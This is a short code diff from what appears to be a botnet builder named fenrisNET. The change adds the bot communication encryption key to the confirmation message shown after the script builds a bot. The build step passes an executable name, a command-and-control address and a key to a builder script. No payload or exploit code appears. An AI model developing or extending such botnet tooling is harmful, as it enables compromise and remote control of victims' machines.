@@ -104,7 +104,7 @@ if os.path.isfile("config"):
         print "</form>"
     else:
 	subprocess.call(["./run.py", "-a", execname, candc, key])
-        print "Bot created. Look for " + execname + ".zip " + "inside your fenrisNET folder.<br /><a href=\"index.html\">Menu</a>"
+        print "Bot created. Look for " + execname + ".zip " + "inside your fenrisNET folder.<br />Bot communication encryption key: " + key + "<br /><a href=\"index.html\">Menu</a>"
 else:
     print "Run configuration script first!"
 
